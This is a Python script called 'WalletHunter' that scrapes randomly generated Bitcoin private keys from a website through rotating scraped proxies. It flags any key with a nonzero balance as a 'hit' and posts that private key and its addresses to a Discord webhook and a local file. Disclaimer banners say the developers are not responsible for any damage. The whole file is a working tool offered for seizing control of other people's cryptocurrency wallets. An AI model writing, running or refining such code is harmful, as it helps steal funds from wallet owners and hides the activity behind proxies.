import requests
from requests.structures import CaseInsensitiveDict
from bs4 import BeautifulSoup
from datetime import datetime
import time
import os
from colorama import Fore, Back
from configparser import ConfigParser
import random
import logging
import ctypes

def Send():
    embed = {
        "avatar_url": "",
        "username": "WalletHunter",
        "content": "@everyone",
        "embeds": [
            {
                "author": {
                    "name": "WalletHunter",
                    "url": "https://github.com/z6o",
                    "icon_url": ""
                },
                "description": f"Private Key: {privkey}\nUncompressed Address: {uncompaddy}\nCompressed Address: {compaddy}\nBalance: {balance}\nProxie Type: {proxie_type}",
                "color": 0x000000,
                "footer": {
                    "text": f"WalletHunter | Checked Wallets: {checked} | Hits: {hits}"
                }
            }
        ]
    }
    requests.post(webhook, json=embed)


now = datetime.now()
current_time = now.strftime("%H:%M:%S")


file = 'config.ini'
config = ConfigParser()
config.read(file)
webhook = config['webhook']['webhook']
webhook_test = config['webhook']['webhook_tester']
proxie_scraper = config['proxies']['proxie_scraper']
use_proxies = config['proxies']['use_proxies']
proxie_type = config['proxies']['proxie_type']
warning_message = config['msg']['warning_msg']
log = config['logging']['log_system']
proxies = open("./proxies.txt").read().splitlines()
checked = 0
hits = 0

if log == "True":
    logging.basicConfig(filename='log.log', level=logging.DEBUG,format='%(asctime)s:%(levelname)s:%(message)s')




if warning_message == "True":
    os.system("msg * WARNING EDUCTIONEL PURPOSES ONLY IF YOU GET CAUGHT ITS YOUR FAULT DEVS ARE NOT RESPONSIBLE FOR ANY DAMAGE!")
if webhook_test == "True":
    requests.post(f"{webhook}", json={"content": f"@everyone /nWebhook working."})
if proxie_scraper == "True":
    
    print("Scraping proxies...")
    f = open("./proxies.txt", "a+")
    r = requests.get(f"https://api.proxyscrape.com/?request=displayproxies&proxytype={proxie_type}&timeout=5000")
    for proxy in r.text.split("\n"):
        proxy = proxy.strip()
        if proxy:
            f.write(str(proxy)+"\n")
            
            
   
os.system("cls||clear")

while True:
    ctypes.windll.kernel32.SetConsoleTitleW(f"WalletHunter | Checked Wallets: {checked} | Hits: {hits}")
    url = "https://www.bitcoinlist.io/random"
    headers = CaseInsensitiveDict()
    headers[
        "User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36"
    req = requests.get(url, headers=headers,proxies={f"{proxie_type}": f'{proxie_type}://' + random.choice(proxies)})
    soup = BeautifulSoup(req.content, 'html.parser')
    wallets = soup.find_all("tr")
    for wallet in wallets:
        getwallet = str(wallet.getText()).strip()
        privkey = getwallet.split()[0].strip()
        uncompaddy = getwallet.split()[1].strip()
        compaddy = getwallet.split()[2].strip()
        balance = getwallet.split()[3].strip()
        if "Private Key" in getwallet:
            pass
        else:
            checked += 1
            if float(balance) > 0:
                hits += 1
                Send()
                open('hits.txt', 'a+').write(f"{balance} BTC found in Adress: {compaddy} // Private Key: {privkey}")
            os.system("cls||clear")
            ctypes.windll.kernel32.SetConsoleTitleW(f"WalletHunter | Checked Wallets: {checked} | Hits: {hits}")
            print(f"""{Fore.YELLOW}
██╗    ██╗ █████╗ ██╗     ██╗     ███████╗████████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
██║    ██║██╔══██╗██║     ██║     ██╔════╝╚══██╔══╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
██║ █╗ ██║███████║██║     ██║     █████╗     ██║       ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
██║███╗██║██╔══██║██║     ██║     ██╔══╝     ██║       ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
╚███╔███╔╝██║  ██║███████╗███████╗███████╗   ██║       ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝   ╚═╝       ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                 {Fore.WHITE}v.03{Fore.RESET}
{Fore.YELLOW}

                                {Back.RED}:: DEVS ARE NOT RESPONSIBLE FOR ANY DAMAGE ::{Back.RESET}
                                {Back.RED}:: SO IF SOMETHING HAPPENS ITS YUR FAULT   ::{Back.RESET}

     		      {Fore.RESET}

                      Private Key: {privkey}
                      Uncompressed Address: {uncompaddy}
                      Compressed Address: {compaddy}
                      Balance: {balance}
                      Proxie Type: {proxie_type}
                      

""")
        time.sleep(0.5)



